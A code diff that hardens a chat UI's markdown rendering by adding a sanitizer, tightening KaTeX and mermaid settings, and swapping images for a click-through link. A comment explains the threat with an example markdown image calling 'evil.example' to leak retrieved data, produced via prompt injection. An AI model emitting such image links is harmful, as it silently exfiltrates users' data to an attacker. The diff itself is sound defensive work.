@@ -10,6 +10,7 @@ import rehypeRaw from 'rehype-raw'
 import remarkMath from 'remark-math'
 import mermaid from 'mermaid'
 import { remarkFootnotes } from '@/utils/remarkFootnotes'
+import { katexSecurityOptions, rehypeSanitizeChat } from '@/lib/markdownSecurity'
 
 
 import { Prism as SyntaxHighlighter } from 'react-syntax-highlighter'
@@ -101,6 +102,7 @@ export const ChatMessage = ({
   }, []);
 
   const mainMarkdownComponents = useMemo(() => ({
+    img: BlockedImage,
     code: (props: any) => {
       const { inline, className, children, ...restProps } = props;
       const match = /language-(\w+)/.exec(className || '');
@@ -148,6 +150,7 @@ export const ChatMessage = ({
   }), [message.mermaidRendered, message.role]);
 
   const thinkingMarkdownComponents = useMemo(() => ({
+    img: BlockedImage,
     code: (props: any) => (<CodeHighlight {...props} renderAsDiagram={message.mermaidRendered ?? false} messageRole={message.role} />)
   }), [message.mermaidRendered, message.role]);
 
@@ -202,12 +205,13 @@ export const ChatMessage = ({
                 remarkPlugins={[remarkGfm, remarkFootnotes, remarkMath]}
                 rehypePlugins={[
                   rehypeRaw,
+                  rehypeSanitizeChat as any,
                   ...((katexPlugin && (message.latexRendered ?? true)) ? [[katexPlugin, {
                     errorColor: theme === 'dark' ? '#ef4444' : '#dc2626',
                     throwOnError: false,
                     displayMode: false,
                     strict: false,
-                    trust: true,
+                    ...katexSecurityOptions,
                     // Add silent error handling to avoid console noise
                     errorCallback: (error: string, latex: string) => {
                       // Only show detailed errors in development environment
@@ -241,6 +245,7 @@ export const ChatMessage = ({
               remarkPlugins={[remarkGfm, remarkFootnotes, remarkMath]}
               rehypePlugins={[
                 rehypeRaw,
+                rehypeSanitizeChat as any,
                 ...((katexPlugin && (message.latexRendered ?? true)) ? [[
                   katexPlugin,
                   {
@@ -248,7 +253,7 @@ export const ChatMessage = ({
                     throwOnError: false,
                     displayMode: false,
                     strict: false,
-                    trust: true,
+                    ...katexSecurityOptions,
                     // Add silent error handling to avoid console noise
                     errorCallback: (error: string, latex: string) => {
                       // Only show detailed errors in development environment
@@ -280,6 +285,33 @@ export const ChatMessage = ({
 }
 
 // Remove the incorrect memo export line
+
+/**
+ * Replacement for <img> in rendered answers. Loading a remote image would
+ * send a request to an attacker-chosen URL as soon as the answer renders
+ * (e.g. ![x](https://evil.example/?data=...) produced via prompt injection),
+ * leaking retrieved content without any click. Show the alt text instead,
+ * linking to the source so the user can open it deliberately.
+ */
+const BlockedImage = ({ src, alt }: { src?: string; alt?: string }) => {
+  const { t } = useTranslation()
+  const label = t('retrievePanel.chatMessage.imageNotLoaded', {
+    alt: alt || src || ''
+  })
+  if (!src) {
+    return <span className="text-muted-foreground italic">{label}</span>
+  }
+  return (
+    <a
+      href={src}
+      target="_blank"
+      rel="noopener noreferrer nofollow"
+      className="text-muted-foreground italic underline"
+    >
+      {label}
+    </a>
+  )
+}
 
 interface CodeHighlightProps {
   inline?: boolean
@@ -333,7 +365,7 @@ const CodeHighlight = memo(({ inline, className, children, renderAsDiagram = fal
           mermaid.initialize({
             startOnLoad: false,
             theme: theme === 'dark' ? 'dark' : 'default',
-            securityLevel: 'loose',
+            securityLevel: 'strict',
             suppressErrorRendering: true,
           });
 
